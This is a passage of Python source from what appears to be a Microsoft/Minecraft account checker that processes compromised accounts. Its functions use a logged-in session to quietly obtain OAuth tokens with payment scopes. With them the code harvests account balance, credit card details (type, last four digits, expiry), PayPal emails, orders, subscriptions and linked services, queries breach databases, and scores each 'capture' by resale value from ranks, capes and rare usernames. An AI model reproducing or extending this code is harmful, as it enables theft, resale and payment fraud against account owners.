            if city_m: parts.append(city_m.group(1)[:20])
            if zip_m: parts.append(zip_m.group(1)[:10])
            if parts: return '-'.join(parts)
    except: pass
    return None

def points_to_money(points_str):
    try:
        pts = int(re.sub(r'[^\d]', '', str(points_str)))
        usd = pts / 1000.0
        if usd > 0: return f'{pts}pts (≈${usd:.2f})'
    except: pass
    return points_str

def fetch_active_subscriptions(session):
    try:
        r = session.get('https://account.microsoft.com/services',
                        headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
        subs = []
        for pat in [r'"productName"\s*:\s*"([^"]+)"',
                    r'"subscriptionName"\s*:\s*"([^"]+)"',
                    r'"displayName"\s*:\s*"([^"]{5,50})"']:
            for m in re.finditer(pat, r.text, re.I):
                name = m.group(1).strip()[:40]
                if name and name not in subs: subs.append(name)
        return subs[:8] if subs else None
    except: return None

def fetch_capes_dev(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://api.capes.dev/load/{fmt}',
                         headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        found = []
        cape_checks = {'optifine':'Optifine','labymod':'LabyMod','fivezig':'5zig',
                       'mccapes':'MC','tlauncher':'TLauncher','minecraftcapes':'MinecraftCapes',
                       'wynn':'Wynncraft','cosmetica':'Cosmetica'}
        for key, label in cape_checks.items():
            cd = d.get(key)
            if isinstance(cd, dict) and cd.get('exists'): found.append(label)
            elif cd is True: found.append(label)
        return ', '.join(found) if found else None
    except: return None

def fetch_labymod_profile(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://laby.net/api/v3/user/{fmt}/profile',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        role = d.get('role_name') or d.get('role') or ''
        if role and role.lower() not in ('user','','none'): parts.append(f'Role:{role}')
        if d.get('has_premium') or d.get('isPremium'): parts.append('Premium')
        cosmetics = d.get('cosmetics') or []
        if isinstance(cosmetics, list) and cosmetics: parts.append(f'Cosmetics:{len(cosmetics)}')
        cape = d.get('cape') or d.get('active_cape')
        if cape: parts.append('Cape')
        return ' | '.join(parts) if parts else 'Registered'
    except: return None

def fetch_badlion_profile(username):
    try:
        r = requests.get(f'https://api.badlion.net/user/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('role') or ''
        if rank and rank.lower() not in ('none','','default'): parts.append(f'Rank:{rank}')
        if d.get('banned'): parts.append('⛔Banned')
        if d.get('cape') or d.get('has_cape'): parts.append('Cape')
        return ' | '.join(parts) if parts else 'Registered'
    except: return None

def fetch_tlauncher_cape(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        for url in [f'https://auth.tlauncher.org/skin/profile/texture/login/{fmt}',
                    f'https://tlauncher.org/api/cape/{fmt}']:
            try:
                r = requests.get(url, headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(6), verify=False)
                if r.status_code == 200 and r.text.strip():
                    if 'cape' in r.text.lower(): return 'TLauncher Cape'
            except: continue
        return None
    except: return None

def fetch_5zig_cape(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://textures.5zig.net/user/{fmt}',
                         headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(5), verify=False)
        if r.status_code == 200:
            if 'cape' in r.text.lower() or len(r.content) > 100: return 'Yes'
        return None
    except: return None

def fetch_mineskin_info(username):
    try:
        r = requests.get(f'https://api.mineskin.org/search/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(6), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        skins = d.get('skins') or d.get('data') or []
        if not skins: return None
        skin = skins[0] if isinstance(skins, list) else skins
        parts = []
        views = skin.get('views') or skin.get('usage_count', 0)
        if views: parts.append(f'Views:{views}')
        name_skin = skin.get('name') or ''
        if name_skin: parts.append(f'Name:{name_skin[:20]}')
        return ' | '.join(parts) if parts else 'Listed'
    except: return None

def fetch_mineplex_stats(username):
    for url in [f'https://api.mineplex.com/pc/player/{username}',
                f'https://www.mineplex.com/api/player/{username}']:
        try:
            r = requests.get(url, headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                             timeout=_safe_t(7), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            parts = []
            rank = d.get('rank') or d.get('level_name') or ''
            if rank and rank not in ('Player','',None): parts.append(f'Rank:{rank}')
            level = d.get('level') or d.get('stat_level')
            if level: parts.append(f'Lvl:{level}')
            gems = d.get('gems'); coins = d.get('coins')
            if gems: parts.append(f'Gems:{format_number(gems)}')
            if coins: parts.append(f'Coins:{format_number(coins)}')
            return ' | '.join(parts) if parts else None
        except: continue
    return None

def fetch_wynncraft_stats(username):
    try:
        r = requests.get(f'https://api.wynncraft.com/v3/player/{username}?fullResult=True',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(8), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        if not d: return None
        parts = []
        guild = d.get('guild', {})
        if guild and guild.get('name'): parts.append(f'Guild:{guild["name"]}')
        rank = d.get('rank') or d.get('supportRank') or ''
        if rank and rank not in ('Player','',None): parts.append(f'Rank:{rank}')
        playtime = d.get('playtime')
        if playtime: parts.append(f'Time:{playtime}h')
        chars = d.get('characters', {})
        if chars:
            total_lvl = sum(c.get('level', 0) for c in chars.values() if isinstance(c, dict))
            if total_lvl: parts.append(f'TotalLvl:{total_lvl}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_hive_stats(username):
    try:
        r = requests.get(f'https://api.playhive.com/v0/game/all/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        if not d: return None
        parts = []
        for game, data in list(d.items())[:4]:
            if not isinstance(data, dict): continue
            w = data.get('victories', 0) or data.get('wins', 0) or 0
            k = data.get('kills', 0) or 0
            if int(w) > 0 or int(k) > 0:
                parts.append(f'{game.upper()[:3]}:{k}K/{w}W')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_pika_stats(username):
    try:
        r = requests.get(f'https://stats.pika-network.net/api/profile/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('highest_rank') or ''
        if rank and rank not in ('Default','',None): parts.append(f'Rank:{rank}')
        kdr = d.get('kdr') or d.get('kill_death_ratio')
        if kdr: parts.append(f'KDR:{kdr}')
        divs = d.get('divisions') or []
        if divs and isinstance(divs, list): parts.append(f'Divs:{len(divs)}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_gommehd_stats(username):
    try:
        r = requests.get(f'https://gommeapi.gommeservices.com/player/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('player_rank') or ''
        if rank and rank not in ('Spieler','Player','',None): parts.append(f'Rank:{rank}')
        coins = d.get('coins') or d.get('currency')
        if coins: parts.append(f'Coins:{format_number(coins)}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_mineheroes_stats(username):
    try:
        r = requests.get(f'https://mineheroes.net/api/users/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or ''
        level = d.get('level')
        ks = d.get('killstreak') or d.get('highest_killstreak')
        if rank and rank not in ('default','member','',None): parts.append(f'Rank:{rank}')
        if level: parts.append(f'Lvl:{level}')
        if ks: parts.append(f'KS:{ks}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_minemen_stats(username):
    for url in [f'https://minemenclub.com/api/players/{username}',
                f'https://api.minemenclub.com/player/{username}']:
        try:
            r = requests.get(url, headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                             timeout=_safe_t(7), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            parts = []
            elo = d.get('elo') or d.get('rank_elo')
            wins = d.get('wins') or d.get('globalWins')
            kdr = d.get('kdr')
            if elo: parts.append(f'ELO:{elo}')
            if wins: parts.append(f'Wins:{wins}')
            if kdr: parts.append(f'KDR:{kdr}')
            return ' | '.join(parts) if parts else None
        except: continue
    return None

def fetch_playerdb(username):
    try:
        r = requests.get(f'https://playerdb.co/api/player/minecraft/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        player = d.get('data', {}).get('player', {})
        if not player: return None
        return {'uuid': player.get('id'), 'username': player.get('username'), 'raw_id': player.get('raw_id')}
    except: return None

def fetch_slothpixel_stats(username):
    try:
        r = requests.get(f'https://api.slothpixel.me/api/players/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(10), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        if d.get('error') or d.get('cause'): return None
        parts = []
        rank = (d.get('rank') or d.get('packageRank') or '').strip()
        if rank and rank.upper() not in ('NON','','NORMAL','DEFAULT','NONE'):
            parts.append(f'Rank:{rank}')
        lvl = d.get('level')
        if lvl: parts.append(f'Lvl:{round(float(lvl),1)}')
        karma = d.get('karma', 0)
        if karma: parts.append(f'Karma:{format_number(karma)}')
        games = d.get('stats') or d.get('games') or {}
        bw = games.get('Bedwars') or games.get('bedwars') or {}
        bw_stars = bw.get('level') or bw.get('stars') or bw.get('star') or 0
        bw_fk = bw.get('final_kills_bedwars') or bw.get('final_kills') or 0
        bw_wins = bw.get('wins_bedwars') or bw.get('wins') or 0
        bw_fd = bw.get('final_deaths_bedwars') or bw.get('final_deaths') or 1
        bw_kdr = round(int(bw_fk) / max(int(bw_fd), 1), 2) if bw_fk else 0
        if bw_stars or bw_wins:
            parts.append(f'BW[★{bw_stars} FK:{format_number(int(bw_fk or 0))} W:{format_number(int(bw_wins or 0))} FKDR:{bw_kdr}]')
        sw = games.get('SkyWars') or games.get('skywars') or {}
        sw_lvl = sw.get('level_formatted') or sw.get('level') or sw.get('skywars_level') or 0
        sw_kills = sw.get('kills') or 0
        sw_wins = sw.get('wins') or 0
        sw_deaths = sw.get('deaths') or 1
        sw_kdr = round(int(sw_kills) / max(int(sw_deaths), 1), 2) if sw_kills else 0
        if sw_lvl or sw_wins:
            parts.append(f'SW[Lvl:{sw_lvl} K:{format_number(int(sw_kills or 0))} W:{format_number(int(sw_wins or 0))} KDR:{sw_kdr}]')
        duels = games.get('Duels') or games.get('duels') or {}
        d_wins = duels.get('wins') or 0
        d_div = duels.get('best_overall_division') or duels.get('division') or ''
        if d_wins or d_div: parts.append(f'Duels[W:{d_wins} {d_div}]'.strip())
        mm = games.get('MurderMystery') or games.get('murdermystery') or {}
        mm_wins = mm.get('wins') or 0
        mm_kills = mm.get('kills') or 0
        if mm_wins: parts.append(f'MM[W:{mm_wins} K:{mm_kills}]')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_github_by_email(email_addr):
    try:
        username = email_addr.split('@')[0] if '@' in email_addr else email_addr
        r = requests.get(f'https://api.github.com/users/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/vnd.github+json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code == 200:
            d = r.json()
            parts = []
            repos = d.get('public_repos', 0)
            followers = d.get('followers', 0)
            if repos: parts.append(f'Repos:{repos}')
            if followers: parts.append(f'Followers:{followers}')
            return ' | '.join(parts) if parts else 'Registered'
        r2 = requests.get(f'https://api.github.com/search/users?q={email_addr}+in:email',
                          headers={'User-Agent':'Mozilla/5.0','Accept':'application/vnd.github+json'},
                          timeout=_safe_t(7), verify=False)
        if r2.status_code == 200:
            items = r2.json().get('items', [])
            if items:
                login = items[0].get('login','')
                return f'@{login}' if login else 'Found'
        return None
    except: return None

def fetch_cosmetica(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://cosmetica.cc/api/users/{fmt}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        if d.get('cape') or d.get('hasCape'): parts.append('Cape')
        cosmetics = d.get('cosmetics') or []
        if isinstance(cosmetics, list) and cosmetics: parts.append(f'Cosmetics:{len(cosmetics)}')
        plus = d.get('plus') or d.get('isPremium') or d.get('premium')
        if plus: parts.append('Plus')
        return ' | '.join(parts) if parts else 'Registered'
    except: return None

def fetch_essential_cosmetics(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://api.essential.gg/v1/profiles/{fmt}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        if isinstance(d, list) and d: d = d[0]
        cosmetics = d.get('cosmetics') or d.get('ownedCosmetics') or []
        if isinstance(cosmetics, (list, dict)):
            cnt = len(cosmetics) if isinstance(cosmetics, list) else len(cosmetics.keys())
            if cnt: parts.append(f'Cosmetics:{cnt}')
        plus = d.get('essential_plus') or d.get('isPlus') or d.get('plus')
        if plus: parts.append('Essential+')
        return ' | '.join(parts) if parts else 'Registered'
    except: return None

def fetch_minecraftcapes(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        for url in [f'https://minecraftcapes.net/profile/{fmt}',
                    f'https://api.minecraftcapes.net/profile/{fmt}']:
            try:
                r = requests.get(url, headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                                 timeout=_safe_t(6), verify=False)
                if r.status_code != 200: continue
                d = r.json()
                if d.get('cape') or d.get('hasCape') or d.get('capeEnabled'): return 'Cape'
                if d.get('ears') or d.get('hasEars'): return 'Ears'
            except: continue
        return None
    except: return None

def fetch_quasar_cape(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://quasar.cc/api/user/{fmt}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(6), verify=False)
        if r.status_code == 200:
            d = r.json()
            if d.get('cape') or d.get('hasCape') or d.get('premium'): return 'Yes'
        return None
    except: return None

def fetch_feather_client(username):
    try:
        for url in [f'https://feathermc.com/api/user/{username}',
                    f'https://api.feathermc.com/v1/user/{username}']:
            try:
                r = requests.get(url, headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                                 timeout=_safe_t(6), verify=False)
                if r.status_code != 200: continue
                d = r.json()
                parts = []
                if d.get('cape') or d.get('hasCape'): parts.append('Cape')
                rank = d.get('rank') or d.get('role') or ''
                if rank and str(rank).lower() not in ('user','default','','none'):
                    parts.append(f'Rank:{rank}')
                return ' | '.join(parts) if parts else 'Registered'
            except: continue
        return None
    except: return None

def fetch_salwyrr(uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-','')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://api.salwyrr.com/launcher/profile/{fmt}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(6), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('tier') or ''
        if rank and str(rank).lower() not in ('free','default','','none'):
            parts.append(f'Tier:{rank}')
        if d.get('cape') or d.get('hasCape'): parts.append('Cape')
        return ' | '.join(parts) if parts else 'Registered'
    except: return None

def fetch_zeqa_stats(username):
    for url in [f'https://api.zeqa.net/api/user/{username}',
                f'https://zeqa.net/api/player/{username}']:
        try:
            r = requests.get(url, headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                             timeout=_safe_t(7), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            parts = []
            elo = d.get('elo') or d.get('globalElo') or d.get('ranking')
            if elo: parts.append(f'ELO:{elo}')
            wins = d.get('wins') or d.get('totalWins')
            if wins: parts.append(f'Wins:{wins}')
            rank = d.get('rank') or d.get('rankName') or ''
            if rank and str(rank).lower() not in ('default','','none'): parts.append(f'Rank:{rank}')
            return ' | '.join(parts) if parts else None
        except: continue
    return None

def fetch_jartex_stats(username):
    try:
        r = requests.get(f'https://jartexnetwork.com/api/player/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('group') or ''
        if rank and str(rank).lower() not in ('default','player','','none'):
            parts.append(f'Rank:{rank}')
        level = d.get('level') or d.get('exp_level')
        if level: parts.append(f'Lvl:{level}')
        coins = d.get('coins') or d.get('currency')
        if coins: parts.append(f'Coins:{format_number(coins)}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_galaxite_stats(username):
    try:
        r = requests.get(f'https://api.galaxite.net/v1/player/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('tier') or ''
        if rank and str(rank).lower() not in ('default','','none','member'):
            parts.append(f'Rank:{rank}')
        xp = d.get('xp') or d.get('experience')
        if xp: parts.append(f'XP:{format_number(xp)}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_name_history(username):
    try:
        r = requests.get(f'https://api.ashcon.app/mojang/v2/user/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        history = d.get('username_history') or []
        if len(history) > 1:
            names = [h.get('username','') for h in history if h.get('username')]
            if len(names) > 1: return ' → '.join(names[-4:])
        return None
    except: return None

def fetch_username_rarity(username):
    try:
        if not username or username == 'N/A': return None
        name = str(username).strip()
        score = 0; label = ''
        if len(name) <= 3: score += 100; label = 'Ultra Rare (≤3)'
        elif len(name) == 4: score += 70; label = 'Very Rare (4)'
        elif len(name) <= 6: score += 40; label = 'Rare (5-6)'
        elif len(name) <= 8: score += 15; label = 'Uncommon (7-8)'
        else: label = 'Common'
        if name.isdigit(): score += 30; label += '+NumOnly'
        if re.match(r'^[A-Za-z]+$', name): score += 10; label += '+AlphaOnly'
        return f'{label} (Score:{score})' if score > 0 else None
    except: return None

def check_minecraft_realms(session):
    try:
        r = session.get('https://pc.realms.minecraft.net/worlds',
                        headers={'User-Agent':'Mozilla/5.0','Accept':'application/json',
                                 'Content-Type':'application/json'}, timeout=_safe_t(8), verify=False)
        if r.status_code == 200:
            d = r.json()
            worlds = d.get('servers') or d.get('worlds') or []
            if isinstance(worlds, list) and worlds: return f'{len(worlds)} Realm(s)'
            return 'Access'
        return None
    except: return None

def check_breach_count(email):
    try:
        r = requests.get(f'https://leakcheck.io/api/public?check={email}',
                         headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                         timeout=_safe_t(6), verify=False)
        if r.status_code == 200:
            d = r.json()
            found = d.get('found') or d.get('result') or 0
            if found and int(str(found).replace('+','')) > 0:
                return f'{found} breach(es)'
        return None
    except: return None

def check_short_name_value(username):
    try:
        if not username or username == 'N/A': return None
        n = str(username).strip()
        length = len(n)
        if length > 8: return None
        price_map = {1:'$500+',2:'$200-500',3:'$50-200',4:'$20-80',5:'$10-30',6:'$5-15',7:'$2-8',8:'$1-5'}
        base = price_map.get(length,'')
        extras = []
        if n.isdigit(): extras.append('NumOnly+')
        if re.match(r'^[a-zA-Z]+$', n): extras.append('AlphaOnly+')
        if n.lower() in ('god','pro','king','ace','top','max','win','pvp','mc','op','vip','xd','bot','404','null','void','zero','one'):
            extras.append('PopularWord++')
        suffix = ' ' + ' '.join(extras) if extras else ''
        return f'{base}{suffix}'
    except: return None

def detect_og_name(name):
    if not name or name == 'N/A': return None
    n = str(name).strip()
    if len(n) <= 3 and n.isalpha():  return f'OG-3L ({n})'
    if len(n) == 4 and n.isalpha():  return f'OG-4L ({n})'
    if len(n) == 5 and n.isalpha():  return f'OG-5L ({n})'
    if re.match(r'^[A-Za-z][A-Za-z0-9]{1,5}$', n) and len(n) <= 6: return f'Semi-OG ({n})'
    return None

def get_value_tier(score):
    if score >= 800: return 'S'
    if score >= 400: return 'A'
    if score >= 150: return 'B'
    return 'C'

def calculate_value_score(cap):
    """cap: dict with attributes matching allmc.Capture fields"""
    def _g(k, default=None):
        return cap.get(k, default) if isinstance(cap, dict) else getattr(cap, k, default)
    score = 0
    t = str(_g('type', '') or '').upper()
    if 'ULTIMATE' in t or 'XGPU' in t: score += 800
    elif 'GAME PASS' in t or 'XGP' in t: score += 400
    try:
        if _g('guild_info'): score += 5
        if _g('namemc_favs'):
            try: score += min(int(str(_g('namemc_favs')).replace(',',''))//10, 30)
            except: score += 5
        if _g('bedrock_info'): score += 10
        if _g('paypal_bal'): score += 20
        if _g('cc_types'): score += 15 * min(len(_g('cc_types')), 3)
        if _g('active_subs'): score += 10
        if _g('order_history'): score += 5
        if _g('sw_prestige'): score += 10
        if _g('capes_dev'): score += 15
        if _g('labymod_info') and 'Premium' in str(_g('labymod_info')): score += 20
        if _g('badlion_info') and 'Cape' in str(_g('badlion_info')): score += 15
        if _g('tlauncher_cape'): score += 10
        if _g('wynncraft_info'): score += 8
        if _g('slothpixel_info'): score += 5
        if _g('github_info'): score += 5
        if _g('cosmetica_info') and 'Cape' in str(_g('cosmetica_info')): score += 12
        if _g('essential_info') and 'Essential+' in str(_g('essential_info')): score += 18
        if _g('quasar_cape'): score += 15
        if _g('feather_info') and 'Cape' in str(_g('feather_info')): score += 10
        if _g('realms_info'): score += 8
        _nr = str(_g('name_rarity','') or '')
        if 'Ultra Rare' in _nr: score += 80
        elif 'Very Rare' in _nr: score += 50
        elif 'Rare' in _nr: score += 25
        _snv = str(_g('short_name_value','') or '')
        if '$500+' in _snv: score += 100
        elif '$200' in _snv: score += 70
        elif '$50' in _snv: score += 40
        elif '$20' in _snv: score += 20
        if _g('zeqa_info'): score += 7
        if _g('minemen_info'): score += 8
    except: pass
    try:
        bal = _g('ms_balance', None)
        if bal:
            amt = float(re.sub(r'[^\d.]', '', str(bal)))
            score += min(int(amt * 20), 600)
    except: pass
    pms = _g('ms_payment_methods', []) or []
    if pms: score += len(pms) * 150
    try: score += min(int(_g('bwstars', 0) or 0), 300)
    except: pass
    nw = str(_g('sbnetworth', '') or '')
    if 'B' in nw: score += 400
    elif 'M' in nw: score += 200
    elif 'K' in nw: score += 50
    rank = str(_g('hypixl', '') or '').upper()
    if 'MVP++' in rank or 'YOUTUBE' in rank: score += 200
    elif 'MVP+' in rank: score += 100
    elif 'MVP' in rank:  score += 60
    elif 'VIP+' in rank: score += 40
    elif 'VIP' in rank:  score += 20
    if _g('banned') == 'False': score += 50
    if _g('access') == 'True': score += 80
    if _g('ms_recovery_email'): score += 30
    if _g('capes') and _g('capes') not in ('', None): score += 60
    if _g('cape') == 'Yes': score += 30
    if _g('cubecraft_stats'): score += 40
    if _g('lunar_stats') and 'Premium' in str(_g('lunar_stats')): score += 50
    og = str(_g('og_name', '') or '')
    if 'OG-3L' in og: score += 500
    elif 'OG-4L' in og: score += 200
    elif 'OG-5L' in og: score += 80
    elif 'Semi' in og: score += 40
    return min(score, 9999)


# --- MS Balance helpers ---
def _ms_get_auth_token(session, client_id, scope, redirect_uri, timeout=15):
    try:
        auth_url = (f'https://login.live.com/oauth20_authorize.srf'
                    f'?client_id={client_id}&response_type=token'
                    f'&scope={scope}&redirect_uri={redirect_uri}&prompt=none&mkt=en-US')
        r = session.get(auth_url, timeout=timeout, allow_redirects=True, verify=False)
        token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        if not token and 'access_token' in r.text:
            m = re.search(r'access_token=([^&"]+)', r.text)
            if m: token = m.group(1)
        return token
    except Exception:
        return None

def _ms_get_balance_token(session):
    for cid, sc, rd in [
        ('000000000004773A','PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete','https://account.microsoft.com/auth/complete-silent-delegate-auth'),
        ('000000000004773A','PIFD.Read','https://account.microsoft.com/auth/complete-silent-delegate-auth'),
        ('00000000402B5328','PIFD.Read','https://login.live.com/oauth20_desktop.srf'),
    ]:
        t = _ms_get_auth_token(session, cid, sc, rd)
        if t: return t
    return None

def fetch_ms_balance(session):
    try:
        token = _ms_get_balance_token(session)
        if not token: return None
        hdr = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
               'Origin': 'https://account.microsoft.com', 'Referer': 'https://account.microsoft.com/'}
        for att, ep in enumerate([
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US',
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB',
            'https://paymentinstruments.mp.microsoft.com/v7.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US',
        ]):
            try:
                r = session.get(ep, headers=hdr, timeout=15, verify=False)
                if r.status_code == 200:
                    bm = re.search('"balance":(\\d+\\.?\\d*)', r.text)
                    if bm:
                        bal = bm.group(1)
                        cm = re.search('"currency":"([A-Z]{3})"', r.text)
                        cur = cm.group(1) if cm else 'USD'
                        if float(bal) > 0: return f'{bal} {cur}'
                    return '0.00 USD'
                elif r.status_code == 401:
                    token = _ms_get_balance_token(session)
                    if token: hdr['Authorization'] = f'MSADELEGATE1.0={token}'
                elif r.status_code == 429:
                    time.sleep(random.uniform(1.5, 3.5) * (att + 1))
            except Exception:
                time.sleep(0.5)
        return None
    except Exception:
        return None

def fetch_ms_payment_methods(session):
    try:
        token = _ms_get_balance_token(session)
        if not token: return []
        headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
        r = session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB',
                        headers=headers, timeout=15, verify=False)
        instruments = []
        if r.status_code == 200:
            try:
                data = r.json()
                for item in data:
                    if 'paymentMethod' in item:
                        pm = item['paymentMethod']
                        family = pm.get('paymentMethodFamily')
                        type_ = pm.get('paymentMethodType')
                        if family == 'credit_card':
                            last4 = pm.get('lastFourDigits', 'N/A')
                            expiry = f"{pm.get('expiryMonth','')}/{pm.get('expiryYear','')}"
                            instruments.append(f'CC: {type_} *{last4} ({expiry})')
                        elif family == 'paypal':
                            email = pm.get('email', 'N/A')
                            instruments.append(f'PayPal: {email}')
            except: pass
        return instruments
    except Exception:
        return []

def fetch_ms_order_history(session):
    try:
        r = session.get('https://account.microsoft.com/billing/orders',
                        headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                        timeout=15, verify=False)
        orders = []
        for pat in [r'"productTitle"\s*:\s*"([^"]+)"',
                    r'"itemName"\s*:\s*"([^"]+)"',
                    r'"description"\s*:\s*"([^"]{5,60})"']:
            for m in re.finditer(pat, r.text, re.I):
                item = m.group(1).strip()[:50]
                if item and item not in orders: orders.append(item)
        return orders[:10] if orders else None
    except: return None

def fetch_linked_accounts(session):
    found = []
    try:
        r = session.get('https://account.microsoft.com/privacy/app-access',
                        headers={'User-Agent': 'Mozilla/5.0'}, timeout=15, verify=False)
        txt = r.text.lower()
        if 'steam' in txt: found.append('Steam')
        if 'ea' in txt or 'electronic arts' in txt: found.append('EA/Origin')
        if 'epic' in txt: found.append('Epic')
        if 'discord' in txt: found.append('Discord')
        if 'spotify' in txt: found.append('Spotify')
        if 'netflix' in txt: found.append('Netflix')
        if 'twitch' in txt: found.append('Twitch')
        if 'nintendo' in txt: found.append('Nintendo')
    except: pass
    return found if found else None

def check_donut_smp_standalone(username, proxy=None, api_key=None):
    if not username or username == 'N/A': return None
    url = f'https://api.donutsmp.net/v1/stats/{username}'
    headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
    if api_key: headers['Authorization'] = f'Bearer {api_key}'
    px = {'http': proxy, 'https': proxy} if proxy else None
    try:
        r = requests.get(url, headers=headers, proxies=px, verify=False, timeout=20)
        if r.status_code == 200:
            data = r.json()
            stats_data = data.get('result') if isinstance(data, dict) else None
            if isinstance(stats_data, dict):
                lines = []
